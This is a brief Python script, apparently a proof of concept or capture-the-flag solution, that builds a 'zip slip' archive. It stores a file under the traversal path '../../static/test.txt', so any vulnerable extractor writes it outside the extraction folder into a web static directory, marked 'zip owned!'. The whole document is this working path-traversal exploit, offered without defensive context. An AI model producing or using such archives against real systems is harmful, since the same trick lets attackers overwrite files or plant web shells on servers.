
from zipfile import ZipFile

# 先建立測試檔案
with open("test.txt", "w") as f:
    f.write("zip owned!\n")

with ZipFile("payload.zip", "w") as zipf:
    zipf.write("test.txt", "../../static/test.txt")